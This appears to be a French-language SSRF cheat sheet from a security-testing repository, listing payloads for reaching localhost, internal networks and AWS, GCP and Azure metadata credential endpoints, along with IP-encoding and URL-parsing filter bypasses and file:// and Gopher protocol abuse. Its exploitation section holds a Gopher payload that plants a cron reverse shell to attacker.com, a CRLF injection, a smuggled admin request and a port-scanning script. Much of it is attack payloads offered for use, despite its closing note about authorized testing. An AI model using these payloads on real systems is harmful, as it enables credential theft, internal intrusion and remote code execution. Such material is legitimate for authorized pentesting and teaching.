# 🌐 SSRF — falsification de requêtes côté serveur

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ███████╗███████╗██████╗ ███████╗
  ██╔════╝██╔════╝██╔══██╗██╔════╝
  ███████╗███████╗██████╔╝█████╗  
  ╚════██║╚════██║██╔══██╗██╔══╝  
  ███████║███████║██║  ██║██║     
  ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     
   Server-Side Request Forgery
```

<p align="center">
  <img src="https://img.shields.io/badge/SSRF-Internal_Access-red?style=for-the-badge" alt="SSRF">
  <img src="https://img.shields.io/badge/Cloud-Metadata-blue?style=for-the-badge" alt="Cloud">
  <img src="https://img.shields.io/badge/Bug_Bounty-green?style=for-the-badge" alt="Bug Bounty">
</p>

---

> **Métadonnées et versions :** les URL AWS montrées correspondent à IMDSv1. [IMDSv2 exige un jeton de session](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html) ; ces URL seules ne garantissent donc pas l’accès aux métadonnées. L’exemple de jeton Azure est incomplet : la [documentation officielle](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token) requiert notamment une ressource cible et l’en-tête de métadonnées. Les lignes sources sont conservées.
>
> **Interprétation des variantes :** les écritures d’IP, encodages, protocoles et redirections dépendent du parseur, du client HTTP et du filtrage. Une URL HTTP dirigée vers un port Redis ou SSH ne parle pas automatiquement le protocole de ce service. Une correspondance DNS statique vers une IP locale ne suffit pas à décrire une réassociation DNS. Les plages sont privées ou locales au lien ; les noms « classe A/B/C » sont les libellés historiques de la source.
>
> **Exemples illustratifs :** les fragments Redis/Gopher supposent un encodage et des longueurs RESP cohérents ainsi que des droits et une configuration particuliers ; ils ne constituent pas un exploit autonome garanti. L’envoi d’une requête HTTP forgée ne démontre pas à lui seul une désynchronisation HTTP. L’absence du texte « connection refused » ne prouve pas qu’un port est ouvert ; la gravité réelle dépend des accès obtenus. Le dessin ASCII et les valeurs des payloads restent inchangés.

## 🎯 Qu’est-ce qu’une SSRF

Une **SSRF** (Server-Side Request Forgery) permet à un attaquant de faire émettre par le serveur des requêtes vers des destinations non prévues, avec un accès possible à des services internes ou aux métadonnées cloud.

### Conséquences
- 🔴 **Accès au réseau interne** — Analyser des services internes
- 🔴 **Métadonnées cloud** — Dérober des identifiants AWS/GCP
- 🔴 **Contournement des pare-feu** — Accéder à des ressources protégées
- 🔴 **Exécution de code à distance (RCE)** — Possible dans certains cas

---

## 🔍 Où chercher

### Paramètres courants
```
url=
uri=
path=
dest=
redirect=
redirect_uri=
next=
data=
reference=
site=
html=
val=
validate=
domain=
callback=
return=
page=
feed=
host=
port=
to=
out=
view=
dir=
```

### Fonctionnalités souvent concernées
```
- Récupération et validation d’URL
- Générateurs de PDF
- Traitement d’images
- Importations de fichiers
- Webhooks
- Intégrations d’API
- Outils d’extraction de données web (web scrapers)
- Services de capture d’écran
```

---

## 💉 Charges utiles de base

### Hôte local (localhost)
```
http://localhost
http://localhost:80
http://localhost:443
http://localhost:22
http://127.0.0.1
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1
http://0.0.0.0
http://0
http://[::1]
http://[0000::1]
```

### Réseaux internes
```
# Classe A (libellé historique de la source)
http://10.0.0.1
http://10.10.10.10
http://10.255.255.255

# Classe B (libellé historique de la source)
http://172.16.0.1
http://172.31.255.255

# Classe C (libellé historique de la source)
http://192.168.0.1
http://192.168.1.1
http://192.168.255.255

# Adresses locales au lien (link-local)
http://169.254.169.254
```

### Ports courants
```
http://127.0.0.1:21    # FTP
http://127.0.0.1:22    # SSH
http://127.0.0.1:23    # Telnet
http://127.0.0.1:25    # SMTP
http://127.0.0.1:80    # HTTP
http://127.0.0.1:443   # HTTPS
http://127.0.0.1:3306  # MySQL
http://127.0.0.1:5432  # PostgreSQL
http://127.0.0.1:6379  # Redis
http://127.0.0.1:27017 # MongoDB
http://127.0.0.1:8080  # Autre port HTTP
http://127.0.0.1:9200  # Elasticsearch
```

---

## ☁️ Métadonnées cloud

### AWS
```
# Métadonnées d’instance (IMDSv1)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# Données particulières
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4
```

### Google Cloud (GCP)
```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/project/

# Avec l’en-tête requis
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01

# Nécessite un en-tête
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

### DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
```

---

## 🛡️ Techniques de contournement

### Formats d’adresses IP
```
# Décimal
http://2130706433  # = 127.0.0.1
http://3232235521  # = 192.168.0.1

# Hexadécimal
http://0x7f000001  # = 127.0.0.1
http://0x7f.0x0.0x0.0x1

# Octal
http://0177.0.0.01  # = 127.0.0.1
http://0177.0.0.0

# Formats mixtes
http://127.1
http://127.0.1
http://0
```

### Encodage d’URL
```
http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
http://localhost → http://%6c%6f%63%61%6c%68%6f%73%74

# Double encodage
http://%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%36%38%25%36%66%25%37%33%25%37%34
```

### Réassociation DNS (DNS rebinding)
```
# Exemples de services cités dans la source :
# - spoofed.burpcollaborator.net
# - 7f000001.rbndr.us  → 127.0.0.1
# - 1.localtest.me → 127.0.0.1

# Configurer son propre DNS
your-domain.com → 127.0.0.1
```

### Différences d’analyse des URL
```
# Variante utilisant @
http://attacker.com@127.0.0.1
http://127.0.0.1#@attacker.com
http://127.0.0.1?@attacker.com
http://attacker.com\@127.0.0.1

# Fragments
http://127.0.0.1#.attacker.com
http://127.0.0.1?.attacker.com

# Barre oblique inverse
http://attacker.com\127.0.0.1
```

### Utilisation détournée d’autres protocoles
```
# Fichier
file:///etc/passwd
file://127.0.0.1/etc/passwd

# Gopher
gopher://127.0.0.1:6379/_INFO

# Dict
dict://127.0.0.1:6379/INFO

# LDAP
ldap://127.0.0.1:389

# TFTP
tftp://127.0.0.1/file.txt
```

### Chaîne de redirections ouvertes
```
# Si le site comporte une redirection ouverte :
https://target.com/redirect?url=http://169.254.169.254/

# Rediriger vers une destination interne
http://target.com/redirect?url=http://127.0.0.1:8080
```

### Variantes IPv6 de contournement
```
http://[::1]
http://[0:0:0:0:0:0:0:1]
http://[::ffff:127.0.0.1]
http://[::]
```

### Injection d’en-têtes
```
# Injection CRLF dans l’URL
http://attacker.com%0d%0aHost:%20127.0.0.1%0d%0a
```

---

## 🔥 Exploitation

### Exécution de code Redis via Gopher
```
# Générer la charge utile
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a
*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1
%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

### Désynchronisation des requêtes HTTP (HTTP request smuggling)
```
gopher://127.0.0.1:80/_POST%20/internal/admin%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2020%0d%0a%0d%0acommand=id
```

### Analyse des ports
```python
import requests

target = "https://vulnerable.com/fetch?url="
ports = [21, 22, 23, 25, 80, 443, 3306, 6379, 8080]

for port in ports:
    url = f"{target}http://127.0.0.1:{port}"
    r = requests.get(url, timeout=5)
    if "connection refused" not in r.text.lower():
        print(f"[OPEN] Port {port}")
```

---

## 📊 Référence rapide

### Détection
```
# Tester la présence d’une SSRF
?url=http://burpcollaborator.net
?url=http://webhook.site/xxxx

# Examiner les résultats
- Une requête DNS a-t-elle été reçue ?
- Une requête HTTP a-t-elle été reçue ?
- Les adresses IP internes produisent-elles des réponses différentes ?
```

### Niveaux de gravité

| Cible | Conséquences |
|--------|--------|
| Métadonnées cloud | Critique — Vol d’identifiants |
| API internes | Élevé — Accès aux données |
| Services internes | Élevé — Exécution de code potentielle |
| Analyse des ports | Modéré — Divulgation d’informations |

### Filtres et variantes de contournement courants

| Filtre | Contournement |
|--------|--------|
| Blocage de `localhost` | Utiliser `127.0.0.1`, `0`, `[::1]` |
| Blocage de `127.0.0.1` | Utiliser la forme décimale `2130706433` |
| Blocage des IP privées | Utiliser la réassociation DNS |
| HTTP uniquement | Essayer `gopher://`, `file://` |
| Liste de domaines autorisés | Variantes avec `@` ou redirection ouverte |

---

## 🛠️ Outils

```bash
# SSRFmap
python3 ssrfmap.py -r request.txt -p url -m readfiles

# Gopherus (générateur de charges utiles Gopher)
python gopherus.py --exploit redis

# Collaborator ou webhook pour une SSRF aveugle
# - Burp Collaborator
# - webhook.site
# - requestbin.com
```

---

## 📚 Ressources

- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [SSRF Bible](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

---

<p align="center">
  <b>🌐 Comprenez et testez les SSRF !</b><br>
  <i>Uniquement dans le cadre de tests autorisés !</i>
</p>
